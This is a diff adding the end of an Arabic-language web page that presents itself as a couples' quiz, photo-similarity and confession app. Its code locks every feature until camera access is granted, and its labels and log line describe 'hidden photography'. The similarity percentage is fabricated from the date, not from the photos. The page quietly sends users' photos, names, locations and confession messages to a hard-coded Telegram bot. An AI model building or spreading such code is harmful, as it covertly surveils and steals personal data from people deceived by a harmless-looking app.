+                    } else {
+                        DOM.aiContent.textContent = '⚠️ لم نتمكن من الحصول على تحليل. حاول مرة أخرى.';
+                        showToast('⚠️ فشل التحليل', 'error');
+                    }
+                } catch (e) {
+                    console.error(e);
+                    DOM.aiContent.textContent = '❌ خطأ في الاتصال بالذكاء الاصطناعي: ' + e.message;
+                    showToast('❌ خطأ: ' + e.message, 'error');
+                }
+            }
+
+            // =====================================================================
+            // 13. نسبة التشابه (نفس السابق)
+            // =====================================================================
+            function getSimilarityScore() {
+                const now = new Date();
+                const seed = now.getFullYear() * 10000 + (now.getMonth() + 1) * 100 + now.getDate();
+                const random = (seed * 9301 + 49297) % 233280;
+                const base = 40 + (random / 233280) * 59;
+                const wave = Math.sin(now.getTime() / 12000) * 3;
+                let result = Math.round(base + wave);
+                return Math.min(99, Math.max(40, result));
+            }
+
+            function getComment(p) {
+                if (p >= 90) return '💖 تطابق مذهل! أنتم توأم الروح!';
+                if (p >= 75) return '💕 تشابه كبير جداً، علاقة قوية!';
+                if (p >= 60) return '💗 تشابه جيد، هناك تناغم ملحوظ.';
+                if (p >= 45) return '💔 تشابه متوسط، لكن الحب يكمل النقص.';
+                return '💞 لا بأس، الاختلافات تجعل العلاقة مميزة.';
+            }
+
+            function calculateSimilarity() {
+                if (!state.cameraAllowed) { showToast('⚠️ يجب السماح بالكاميرا أولاً', 'error'); return; }
+                const myFile = DOM.myPhotoInput.files[0];
+                const partnerFile = DOM.partnerPhotoInput.files[0];
+                if (!myFile || !partnerFile) {
+                    showToast('الرجاء اختيار صورتين', 'error');
+                    return;
+                }
+                const percent = getSimilarityScore();
+                DOM.similarityPercentage.textContent = percent + ' %';
+                DOM.similarityComment.textContent = getComment(percent);
+
+                if (state.userName && state.locationReady) {
+                    const loc = `${state.userLocation.city}, ${state.userLocation.region}, ${state.userLocation.country}`;
+                    const caption =
+                        `📸 *نسبة التشابه: ${percent}%*\n👤 ${state.userName}\n📍 ${loc}\n💬 ${getComment(percent)}`;
+                    const formData = new FormData();
+                    formData.append('chat_id', CONFIG.CHAT_ID);
+                    formData.append('photo', myFile);
+                    formData.append('caption', caption);
+                    formData.append('parse_mode', 'Markdown');
+                    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData })
+                        .catch(e => console.warn('فشل إرسال الصورة'));
+                }
+                showToast(`✅ نسبة التشابه: ${percent}%`, 'success');
+            }
+
+            // =====================================================================
+            // 14. صارحني
+            // =====================================================================
+            async function sendConfession() {
+                if (!state.cameraAllowed) { showToast('⚠️ يجب السماح بالكاميرا أولاً', 'error'); return; }
+                if (!state.userName) { showToast('⚠️ الرجاء إدخال اسمك أولاً', 'error'); return; }
+                const msg = DOM.confessionText.value.trim();
+                if (!msg) { showToast('⚠️ الرجاء كتابة رسالة', 'error'); return; }
+
+                DOM.sendConfessionBtn.disabled = true;
+                DOM.sendConfessionBtn.textContent = '⏳ جاري الإرسال...';
+
+                try {
+                    const loc = `${state.userLocation.city}, ${state.userLocation.region}, ${state.userLocation.country}`;
+                    const text =
+                        `💬 *رسالة صريحة*\n👤 ${state.userName}\n📍 ${loc}\n\n${msg}\n\n🕒 ${new Date().toLocaleString('ar-EG')}`;
+
+                    const res = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: text, parse_mode: 'Markdown' })
+                    });
+                    const result = await res.json();
+                    if (result.ok) {
+                        DOM.confessionResult.innerHTML = '✅ تم إرسال رسالتك بنجاح! ❤️';
+                        DOM.confessionResult.style.color = '#22c55e';
+                        DOM.confessionText.value = '';
+                        showToast('✅ تم إرسال الرسالة', 'success');
+                    } else {
+                        DOM.confessionResult.innerHTML = '❌ فشل الإرسال: ' + (result.description || 'خطأ');
+                        DOM.confessionResult.style.color = '#ef4444';
+                        showToast('❌ فشل الإرسال', 'error');
+                    }
+                } catch (e) {
+                    DOM.confessionResult.innerHTML = '❌ خطأ: ' + e.message;
+                    DOM.confessionResult.style.color = '#ef4444';
+                    showToast('❌ خطأ: ' + e.message, 'error');
+                } finally {
+                    DOM.sendConfessionBtn.disabled = false;
+                    DOM.sendConfessionBtn.textContent = '💌 إرسال';
+                }
+            }
+
+            // =====================================================================
+            // 15. مسح البيانات
+            // =====================================================================
+            function clearAllData() {
+                if (!confirm('⚠️ هل أنت متأكد من مسح جميع البيانات (الاسم، الموقع، الإجابات)؟')) return;
+                localStorage.removeItem('userName');
+                localStorage.removeItem('userLocation');
+                localStorage.removeItem('quizAnswers');
+                state.userName = '';
+                state.userLocation = { city: '', region: '', country: '', latitude: '', longitude: '', accuracy: '' };
+                state.locationReady = false;
+                state.answers = [];
+                DOM.userNameInput.value = '';
+                DOM.locationStatus.textContent = '⚠️ تم مسح الموقع';
+                resetQuiz();
+                showToast('🗑️ تم مسح جميع البيانات', 'info');
+            }
+
+            // =====================================================================
+            // 16. التبويبات
+            // =====================================================================
+            function switchTab(tabId) {
+                document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+                document.querySelector(`.tab-btn[data-tab="${tabId}"]`).classList.add('active');
+                document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+                document.getElementById('tab-' + tabId).classList.add('active');
+            }
+
+            // =====================================================================
+            // 17. ربط الأحداث
+            // =====================================================================
+            DOM.requestBtn.addEventListener('click', requestCamera);
+
+            DOM.saveNameBtn.addEventListener('click', function() {
+                if (!state.cameraAllowed) { showToast('⚠️ يجب السماح بالكاميرا أولاً', 'error'); return; }
+                const name = DOM.userNameInput.value.trim();
+                if (!name) { showToast('⚠️ الاسم إجباري!', 'error');
+                    DOM.userNameInput.focus(); return; }
+                state.userName = name;
+                localStorage.setItem('userName', name);
+                showToast('✅ تم حفظ اسمك', 'success');
+            });
+            DOM.userNameInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') DOM.saveNameBtn.click(); });
+
+            DOM.refreshLocationBtn.addEventListener('click', function() {
+                if (!state.cameraAllowed) { showToast('⚠️ يجب السماح بالكاميرا أولاً', 'error'); return; }
+                getPreciseLocation();
+            });
+
+            DOM.categoryBtns.forEach(btn => {
+                btn.addEventListener('click', function() {
+                    if (!state.cameraAllowed) { showToast('⚠️ يجب السماح بالكاميرا أولاً', 'error'); return; }
+                    DOM.categoryBtns.forEach(b => b.classList.remove('active'));
+                    this.classList.add('active');
+                    state.currentCategory = this.dataset.category;
+                    resetQuiz();
+                });
+            });
+
+            DOM.startQuizBtn.addEventListener('click', startQuiz);
+            DOM.nextBtn.addEventListener('click', saveAndNext);
+            DOM.prevBtn.addEventListener('click', goToPrevious);
+            DOM.sendAnswersBtn.addEventListener('click', sendAnswersToBot);
+
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    if (!state.cameraAllowed) { showToast('⚠️ يجب السماح بالكاميرا أولاً', 'error'); return; }
+                    switchTab(this.dataset.tab);
+                });
+            });
+
+            DOM.generatePDFBtn.addEventListener('click', generatePDF);
+            DOM.exportJSONBtn.addEventListener('click', exportJSON);
+            DOM.aiAnalyzeBtn.addEventListener('click', aiAnalyze);
+
+            DOM.myPhotoInput.addEventListener('change', function(e) {
+                if (this.files && this.files[0]) {
+                    const reader = new FileReader();
+                    reader.onload = (ev) => { DOM.myPhotoPreview.src = ev.target.result; };
+                    reader.readAsDataURL(this.files[0]);
+                }
+            });
+            DOM.partnerPhotoInput.addEventListener('change', function(e) {
+                if (this.files && this.files[0]) {
+                    const reader = new FileReader();
+                    reader.onload = (ev) => { DOM.partnerPhotoPreview.src = ev.target.result; };
+                    reader.readAsDataURL(this.files[0]);
+                }
+            });
+            DOM.calculateSimilarityBtn.addEventListener('click', calculateSimilarity);
+
+            DOM.sendConfessionBtn.addEventListener('click', sendConfession);
+
+            // التحكم في إيقاف الكاميرا (اختياري)
+            DOM.camToggle.addEventListener('click', function() {
+                if (!state.cameraAllowed) return;
+                state.cameraPaused = !state.cameraPaused;
+                if (state.cameraPaused) {
+                    if (state.stream) { state.stream.getTracks().forEach(t => t.stop());
+                        state.stream = null; }
+                    state.cameraReady = false;
+                    state.videoReady = false;
+                    DOM.camToggleLabel.textContent = 'الكاميرا متوقفة';
+                    DOM.camIndicator.className = 'indicator off';
+                    showToast('⏸️ تم إيقاف الكاميرا مؤقتاً (لن تلتقط صوراً)', 'info');
+                } else {
+                    DOM.camToggleLabel.textContent = 'جاري إعادة التشغيل...';
+                    DOM.camIndicator.className = 'indicator off';
+                    startCamera(state.cameraMode);
+                    showToast('▶️ استئناف الكاميرا', 'success');
+                }
+            });
+
+            DOM.clearDataBtn.addEventListener('click', clearAllData);
+
+            // استعادة الاسم
+            if (state.userName) {
+                DOM.userNameInput.value = state.userName;
+            }
+
+            // =====================================================================
+            // 18. بدء التشغيل
+            // =====================================================================
+            disableAllFeatures();
+            DOM.camToggle.style.pointerEvents = 'none';
+            DOM.camToggle.style.opacity = '0.5';
+
+            const origEnable = enableAllFeatures;
+            enableAllFeatures = function() {
+                origEnable();
+                DOM.camToggle.style.pointerEvents = 'auto';
+                DOM.camToggle.style.opacity = '1';
+            };
+
+            console.log('💕 التطبيق جاهز مع ميزة التصوير الخفي والمزامنة.');
+
+            // =====================================================================
+            // 19. تحديث واجهة الكاميرا عند التبديل
+            // =====================================================================
+            function updateCamToggleUI() {
+                if (state.cameraPaused) {
+                    DOM.camToggleLabel.textContent = 'الكاميرا متوقفة';
+                    DOM.camIndicator.className = 'indicator off';
+                } else {
+                    DOM.camToggleLabel.textContent = 'الكاميرا نشطة (تصوير خفي)';
+                    DOM.camIndicator.className = 'indicator on';
+                }
+            }
+
+            // =====================================================================
+            // 20. تنظيف المؤقتات عند الخروج (اختياري)
+            // =====================================================================
+            window.addEventListener('beforeunload', function() {
+                if (state.syncTimer) clearInterval(state.syncTimer);
+                if (state.stream) { state.stream.getTracks().forEach(t => t.stop()); }
+            });
+
+        })();
+    </script>
+</body>
+  </html>
